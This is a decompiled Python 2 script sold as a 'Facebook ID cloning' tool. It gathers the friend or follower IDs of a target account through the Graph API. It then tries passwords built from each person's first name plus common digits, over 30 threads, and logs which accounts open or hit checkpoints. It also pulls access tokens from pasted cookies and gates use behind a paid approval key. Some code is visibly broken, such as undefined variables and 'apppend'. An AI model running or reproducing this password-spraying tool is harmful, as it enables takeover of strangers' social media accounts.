# Decompiled By CHIGOZIE
# Github : https://github.com/CHIGOZIEWORLDWIDE
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, JANUARY 1 2022, 12:00:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'RIAZKHAN'
__copyright = 'All rights reserved . Copyright  CHIGOZIE'
os.system('pip2 install requests')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; Lenovo A2010-a Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/4 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
c = '\x1b[1;32m\x1b[0;97m\x1b[1;32m'
c2 = '\x1b[0;97m\x1b[1;32m\x1b[0;97m'
c3 = '\x1b[1;31m\x1b[0;97m\x1b[1;31m'
os.system('git pull')
os.system('clear')
logo = """
:'#######::::'#####::::'#######:::'#######::
'##.... ##::'##.. ##::'##.... ##:'##.... ##:
..::::: ##:'##:::: ##:..::::: ##:..::::: ##:
:'#######:: ##:::: ##::'#######:::'#######::
'##:::::::: ##:::: ##:'##::::::::'##::::::::
 ##::::::::. ##:: ##:: ##:::::::: ##::::::::
 #########::. #####::: #########: #########:
.........::::.....::::.........::.........::
                                                                               
                                                                               

\033[37;1m[\033[41;1m FACEBOOK I'D CLONING \033[00;1m\033[37;1m ]\n

 \033[32;1mCreator \033[37;1m: \033[33;1mRIAZKHAN

 \033[32;1mVersion \033[37;1m: \033[33;1m500




"""

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mChecking Approval'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.server.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/RIAZ-KHAN/zoom/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(4)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed'
        print ''
        print ' \033[1;34;40mYour Id Is Not Approved '
        print ''
        print ' \033[1;34;40mCopy Token id and send To WhatsApp'
        print ''
        print ' \033[1;34;40mYour id: ' + to
        print ''
        raw_input('\x1b[1;93m Press Enter to Send id')
        os.system('xdg-open  https://wa.me/+923188214452?text=Hello%2C%20RIAZKHAN%20my%20name%20is')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval Not detected'
    print ''
    print ' \033[1;34;40mCopy and press enter , Send This Api Key To The Owner'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Api Key: ' + id
    print ''
    print ''
    raw_input(' Press Enter To Go To WHATSAPP ')
    os.system('xdg-open https://wa.me/+923188214452')
    sav = open('/sdcard/.server.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;34;40m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['Country']
        regi = z['RegionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;93m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\x1b[1;95m Your country: ' + country
    time.sleep(2)
    print ''
    print '\033[1;34;40m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \x1b[1;97mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m Login menu'
        print ''
        print '\033[1;34;40m[1] Login with FaceBook'
        print '\033[1;34;40m[2] Login with Token'
        print '\033[1;34;40m[3] Login with Cookies'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80KACHI\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin with id/pass'
    print ''
    lid = raw_input('\033[1;34;40m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' User Must Verify Account Before Login'
            print ''
            raw_input('\033[1;34;40m Press enter to try again ')
            log_fb()
        else:
            print ''
            print ' Id/Pass may be wrong'
            print ''
            raw_input(' \033[1;34;40mPress Enter To Try Again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93mLogin with Token'
    print ''
    tok = raw_input(' \033[1;34;40mPaste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin Cookies'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; Lenovo A2010-a Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/4', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;34;40mPress Enter To Try Again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;34;40mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;34;40mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\x1b[1;31;1mLogin FB id to Continue'
        print ''
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Checkpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;34;40mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.RIAZ.txt', 'r').read()
    print ''
    print '  \033[1;34;40mLogged in user: ' + z
    print ''
    print ' \x1b[1;93m Active token: ' + tok
    print ''
    print ' ------------------------------------------ '
    print ''
    print '\033[1;34;40m[1] Choice Passwords digits'
    print '\033[1;34;40m[2] Extract Link For File'
    print '\033[1;34;40m[3] View token'
    print '\033[1;34;40m[4] Logout'
    print '\033[1;34;40m[5] Delete trash files'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\033[1;34;40m\xe2\x95\xb0\xe2\x94\x80KACHI\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
        print '[!] Please Wait While Page Is Loding.'
        os.system('python2 hacking-13.py')
        time.sleep(1)
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
    elif ms == '5':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m Choice pass Cloning '
    print ''
    print '\033[1;34;40m[1] Public ID Cloning'
    print '\033[1;34;40m[2] Followers Cloning'
    print '\033[1;34;40m[3] File Cloning'
    print '\033[1;34;40m[0] Back'
    print ''
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to Continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m Choice Pass Cracking'
    print ''
    print '\033[1;34;40m[1] Public ID Cloning'
    print '\033[1;34;40m[2] Followers Cloning'
    print '\033[1;34;40m[3] File Cloning'
    print '\033[1;34;40m[0] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80KACHI\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m Choice Pass Public Cloning'
        print ''
        print '\x1b[1;93m Like Az: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;34;40m[1]Name + digit: ')
        p2 = raw_input(' \033[1;34;40m[2]Name + digit: ')
        p3 = raw_input(' \033[1;34;40m[3]Name + digit: ')
        pass4 = raw_input('\033[1;34;40m[4]Password: ')
        pass5 = raw_input('\033[1;34;40m[5]Password: ')
        pass6 = raw_input('\033[1;34;40m[6]Password: ')
        pass7 = raw_input('\033[1;34;40m[7]Password: ')
        pass8 = raw_input('\033[1;34;40m[8]Password: ')
        idt = raw_input('\x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m Choice Pass Public Cracking'
            print ''
            print ' \033[1;34;40mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \033[1;34;40mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m Choice Pass Pass Followers Cloning'
        print ''
        print ' \x1b[1;93mLike Az: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;34;40m[1]Name + digit: ')
        p2 = raw_input(' \033[1;34;40m[2]Name + digit: ')
        p3 = raw_input(' \033[1;34;40m[3]Name + digit: ')
        pass4 = raw_input('\033[1;34;40m[4]Password: ')
        pass5 = raw_input('\033[1;34;40m[5]Password: ')
        pass6 = raw_input('\033[1;34;40m[6]Password: ')
        pass7 = raw_input('\033[1;34;40m[7]Password: ')
        pass8 = raw_input('\033[1;34;40m[8]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;31;1m Choice Pass Followers Cracking '
            print ' \033[1;34;40mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\033[1;34;40mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m Choice Pass File Cloning'
        print ''
        print '\x1b[1;93m like Az: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;34;40m[1]Name + digit: ')
        p2 = raw_input(' \033[1;34;40m[2]Name + digit: ')
        p3 = raw_input(' \033[1;34;40m[3]Name + digit: ')
        pass4 = raw_input('\033[1;34;40m[4]Password: ')
        pass5 = raw_input('\033[1;34;40m[5]Password: ')
        pass6 = raw_input('\033[1;34;40m[6]Password: ')
        pass7 = raw_input('\033[1;34;40m[7]Password: ')
        pass8 = raw_input('\033[1;34;40m[8]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93m Cloning Start '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32m[RIAZ]\x1b[0;97m'
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass1
                cp = open('RIAZ_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/khan_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass2
                    cp = open('khan_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass3
                        cp = open('RIAZ_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass4
                            cp = open('RIAZ_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass5
                                cp = open('RIAZ_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass6
                                    cp = open('RIAZ_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass7
                                        cp = open('RIAZ_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;32;40m[RIAZ-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/RIAZ_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\033[1;35;40m[RIAZ-CP] ' + uid + ' | ' + pass8
                                            cp = open('RIAZ_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \033[1;34;40mProcess Has Been Completed'
    print ' \033[1;34;40mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \x1b[1;93mPress ENTER to BACK')
    auto_crack()


if __name__ == '__main__':
    reg()
